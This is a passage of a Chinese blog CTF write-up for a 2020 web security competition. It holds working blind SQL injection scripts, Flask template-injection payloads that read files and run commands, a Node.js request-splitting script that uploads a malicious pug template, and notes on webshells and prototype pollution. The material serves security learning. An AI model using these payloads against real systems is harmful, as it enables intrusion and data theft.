class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">#-*- coding:utf8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;0365e3e590804cff9ae00511314e9994c04ae9b25b574cac.changame.ichunqiu.com&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">def exp1():</span><br><span class="line">    str1 &#x3D; (&#39;0123456789&#39;+string.ascii_letters+string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;\\&#39;,&#39;&#39;)</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    select &#x3D; &#39;select group_concat(table_name) from sys.x$schema_flattened_keys&#39;</span><br><span class="line">    for j in range(1,40):</span><br><span class="line">        for i in str1:</span><br><span class="line">            paylaod &#x3D; &quot;1&#x2F;**&#x2F;&amp;&amp;&#x2F;**&#x2F;(select substr((&#123;&#125;),&#123;&#125;,1))&#x3D;&#39;&#123;&#125;&#39;&quot;.format(select, j, i)</span><br><span class="line">            #print(paylaod)</span><br><span class="line">            data &#x3D; &#123;</span><br><span class="line">                &#39;id&#39;: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">            if &#39;Nu1L&#39; in r.text:</span><br><span class="line">                flag +&#x3D; i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def exp2():</span><br><span class="line">    str1 &#x3D; (&#39;-0123456789&#39;+string.ascii_uppercase+string.ascii_lowercase+string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;\\&#39;,&#39;&#39;)</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    flag_table_name &#x3D; &#39;f1ag_1s_h3r3_hhhhh&#39;</span><br><span class="line">    for j in range(1,39):</span><br><span class="line">        for i in str1:</span><br><span class="line">            i &#x3D; flag+i</span><br><span class="line">            paylaod &#x3D; &quot;1&amp;&amp;((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; as json))) &lt; (select * from &#123;&#125; limit 1))&quot;.format(i,flag_table_name)</span><br><span class="line">            print(paylaod)</span><br><span class="line">            data &#x3D; &#123;</span><br><span class="line">                &#39;id&#39;: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line"></span><br><span class="line">            if &#39;Nu1L&#39; not in r.text:</span><br><span class="line">                flag&#x3D;i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    exp1()</span><br><span class="line">    exp2()</span><br></pre></td></tr></table></figure>

<h3 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h3><h4 id="3-1-Flaskapp"><a href="#3-1-Flaskapp" class="headerlink" title="3.1 Flaskapp"></a>3.1 Flaskapp</h4><p>ssti+pin码的安全机制</p>
<p>payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;想要读取的文件&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line">或者</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;想要读取的文件&#39;).read()&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;sys&#39;+&#39;tem&#39;](&#39;ls &#x2F;&#39;)&#125;&#125;</span><br><span class="line">反弹shell</span><br></pre></td></tr></table></figure>

<p>最后的读取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(os.popen(&quot;ls -al &#x2F;&quot;).read())</span><br><span class="line">print(os.popen(&quot;cat &#x2F;this_is_the_flag.txt&quot;).read())</span><br></pre></td></tr></table></figure>

<h4 id="3-2-easy-thinking"><a href="#3-2-easy-thinking" class="headerlink" title="3.2 easy_thinking"></a>3.2 easy_thinking</h4><p>预期解法：</p>
<p>先注册一个账号，然后在登录时候burp抓包，修改session，注意长度必须是32位，将session改成<code>.php</code>结尾</p>
<p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225223441544.png" alt></p>
<p>搜索框输入一句话木马，然后访问</p>
<p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225224532369.png" alt></p>
<p>剩下就是绕过，参考 <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a></p>
<p>修改里面参数为pwn(“/readflag”);得到flag</p>
<p>参考资料：</p>
<blockquote>
<p><a href="http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/</a></p>
<p><a href="https://www.gem-love.com/ctf/1669.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1669.html</a></p>
<p><a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/</a></p>
<p><a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/</a></p>
<p><a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p>
</blockquote>
<h3 id="3-3-Node-Game"><a href="#3-3-Node-Game" class="headerlink" title="3.3 Node Game"></a>3.3 Node Game</h3><p>太菜了，比赛的时候做不出来，赛后进行复盘学习QAQ</p>
<ol>
<li>题目给了源代码，首先进行代码审计</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">app.post(&#39;&#x2F;file_upload&#39;, function(req, res)&#123;</span><br><span class="line">    var ip &#x3D; req.connection.remoteAddress;</span><br><span class="line">    var obj &#x3D; &#123;</span><br><span class="line">        msg: &#39;&#39;,</span><br><span class="line">    &#125;</span><br><span class="line">    if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;</span><br><span class="line">        obj.msg&#x3D;&quot;only admin&#39;s ip can use it&quot;</span><br><span class="line">        res.send(JSON.stringify(obj));</span><br><span class="line">        return </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[0].path, function(err, data)&#123;</span><br><span class="line">        if(err)&#123;</span><br><span class="line">            obj.msg &#x3D; &#39;upload failed&#39;;</span><br><span class="line">            res.send(JSON.stringify(obj));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            var file_path &#x3D; &#39;&#x2F;uploads&#x2F;&#39; + req.files[0].mimetype +&quot;&#x2F;&quot;;</span><br><span class="line">            var file_name &#x3D; req.files[0].originalname</span><br><span class="line">            var dir_file &#x3D; __dirname + file_path + file_name</span><br><span class="line">            if(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; catch (error) &#123;</span><br><span class="line">                    obj.msg &#x3D; &quot;file type error&quot;;</span><br><span class="line">                    res.send(JSON.stringify(obj));</span><br><span class="line">                    return</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj &#x3D; &#123;</span><br><span class="line">                    msg: &#39;upload success&#39;,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                obj.msg &#x3D; &#39;upload failed&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(JSON.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>文件上传功能会首先判断IP是否来自127.0.0.1，这里就需要构造SSRF，然后是保存文件，是根据传过去的 MIME 类型和文件名生成路径的，这里控制文件类型进行目录穿越进行任意文件上传。</p>
<p>core路由接收q 参数然后拼接在 /source? 后面进行访问，然后会把访问结果显示出来，这里可以进行ssrf访问，但是存在过滤。nodejs版本提示是8.12.0，存在[request splitting](<a href="http://projects.webappsec.org/w/page/13246929/HTTP" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246929/HTTP</a> Request Splitting)漏洞，攻击原理可以参考这个 <a href="https://xz.aliyun.com/t/2894#toc-2程序在底层处理的时候会舍弃高位的字符" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894#toc-2程序在底层处理的时候会舍弃高位的字符</a>, 只保留低位的字符, 也就是说假如我们传入<code>chr(0xffa0)</code>处理后会被截断为<code>chr(0xa0)</code>，并且这个<code>0xff</code>可更换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#39;&#x2F;core&#39;, function(req, res) &#123;</span><br><span class="line">    var q &#x3D; req.query.q;</span><br><span class="line">    var resp &#x3D; &quot;&quot;;</span><br><span class="line">    if (q) &#123;</span><br><span class="line">        var url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8081&#x2F;source?&#39; + q</span><br><span class="line">        console.log(url)</span><br><span class="line">        var trigger &#x3D; blacklist(url);</span><br><span class="line">        if (trigger &#x3D;&#x3D;&#x3D; true) &#123;</span><br><span class="line">            res.send(&quot;&lt;p&gt;error occurs!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                http.get(url, function(resp) &#123;</span><br><span class="line">                    resp.setEncoding(&#39;utf8&#39;);</span><br><span class="line">                    resp.on(&#39;error&#39;, function(err) &#123;</span><br><span class="line">                    if (err.code &#x3D;&#x3D;&#x3D; &quot;ECONNRESET&quot;) &#123;</span><br><span class="line">                     console.log(&quot;Timeout occurs&quot;);</span><br><span class="line">                     return;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(&#39;data&#39;, function(chunk) &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                         resps &#x3D; chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;catch (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(&#39;error&#39;, (e) &#x3D;&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                console.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.send(&quot;search param &#39;q&#39; missing!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>首页有一块部分接受action参数，并拼接到 template 下的目录用 pug 引擎渲染</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#39;&#x2F;&#39;, function(req, res) &#123;</span><br><span class="line">    var action &#x3D; req.query.action?req.query.action:&quot;index&quot;;</span><br><span class="line">    if( action.includes(&quot;&#x2F;&quot;) || action.includes(&quot;\\&quot;) )&#123;</span><br><span class="line">        res.send(&quot;Errrrr, You have been Blocked&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    file &#x3D; path.join(__dirname + &#39;&#x2F;template&#x2F;&#39;+ action +&#39;.pug&#39;);</span><br><span class="line">    var html &#x3D; pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>利用pug文档中的包含include可以尝试读取根目录flag  参考：<a href="https://pugjs.org/zh-cn/language/includes.html" target="_blank" rel="noopener">包含 Include</a></p>
<ol start="3">
<li>参考赵师傅的脚本发包：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">POST &#x2F;file_upload HTTP&#x2F;1.1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;--------------------------1403693673106942081532243149</span><br><span class="line">Connection: keep-alive</span><br><span class="line">cache-control: no-cache</span><br><span class="line">Host: x</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">----------------------------1403693673106942081532243149</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.pug&quot;</span><br><span class="line">Content-Type: &#x2F;..&#x2F;template</span><br><span class="line"></span><br><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    style</span><br><span class="line">      include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br><span class="line"></span><br><span class="line">----------------------------1403693673106942081532243149--</span><br><span class="line"></span><br><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: close</span><br><span class="line">x:&#39;&#39;&#39;</span><br><span class="line">payload &#x3D; payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)</span><br><span class="line">payload &#x3D; &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)</span><br><span class="line">print(payload)</span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;707e299e-f951-4d9b-ac8a-bc2c3de5a2b8.node3.buuoj.cn&#x2F;core?q&#x3D;&#39; + urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>最后访问/?action=test得到flag</p>
<p>参考资料：</p>
<blockquote>
<p><a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p>
<p><a href="https://xz.aliyun.com/t/2894#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894#toc-2</a></p>
<p><a href="http://blog.5am3.com/2020/02/11/ctf-node1/" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/</a></p>
</blockquote>
<h4 id="3-4-EzExpress"><a href="#3-4-EzExpress" class="headerlink" title="3.4 EzExpress"></a>3.4 EzExpress</h4><p>赛后复盘写的，学习了一下JavaScript原型链污染</p>
<ol>
<li>提示<a href="http://www.zip源代码，访问下载进行审计" target="_blank" rel="noopener">www.zip源代码，访问下载进行审计</a></li>
</ol>
<p>对routes 下路由文件进行审计，开头出现merge 和 clone，存在原型链污染漏洞</p>
<p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213223562.png" alt></p>
<p>在action路由发现只有用户为admin才能触发原型链污染</p>
<p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213453879.png" alt></p>
<p>但是注册的时候不能带有admin</p>
<p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213721947.png" alt></p>
<ol start="2">
<li><p>参考这篇文章，<a href="https://xz.aliyun.com/t/7184#toc-11，利用javascript大小写特性进行绕过，注册adm`ı`n" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184#toc-11，利用javascript大小写特性进行绕过，注册adm`ı`n</a></p>
</li>
<li><p>访问action抓包，构造恶意请求,注意要设置<code>Content-Type: application/json</code></p>
</li>
</ol>
<p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318214151607.png" alt></p>
<ol start="4">
<li>访问<code>/info</code>触发原型链，访问<code>/flag</code>下载即可</li>
</ol>
<p>参考资料：</p>
<blockquote>
<p><a href="https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p>
<p><a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p>
</blockquote>

  </div>
</article>

        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-第一天"><span class="toc-number">1.</span> <span class="toc-text">0x 01 第一天</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-签到"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-code-in-morse"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 code_in_morse</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-ezupload"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 ezupload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-简单的招聘系统"><span class="toc-number">1.4.</span> <span class="toc-text">1.4 简单的招聘系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-盲注"><span class="toc-number">1.5.</span> <span class="toc-text">1.5 盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-6-babyphp"><span class="toc-number">1.6.</span> <span class="toc-text">1.6 babyphp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二天"><span class="toc-number">2.</span> <span class="toc-text">第二天</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-easysqli-copy"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 easysqli_copy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-blacklist"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 blacklist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-Ezsqli"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 Ezsqli</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第三天"><span class="toc-number">3.</span> <span class="toc-text">第三天</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-Flaskapp"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 Flaskapp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-easy-thinking"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 easy_thinking</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-Node-Game"><span class="toc-number">4.</span> <span class="toc-text">3.3 Node Game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-EzExpress"><span class="toc-number">4.1.</span> <span class="toc-text">3.4 EzExpress</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&title=2020新春战疫-网络安全公益赛解题记录" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&title=2020新春战疫-网络安全公益赛解题记录" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/&text=2020新春战疫-网络安全公益赛解题记录" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2020新春战疫-网络安全公益赛解题记录&body=Check out this article: http://yoursite.com/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 John Doe 
    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
    
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
  
  <div class="footer-custom">
    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
     
      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
        <img class="img-response" src="/images/upyun.png" alt="cdn image">
      </a>
    
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">


<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>


<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
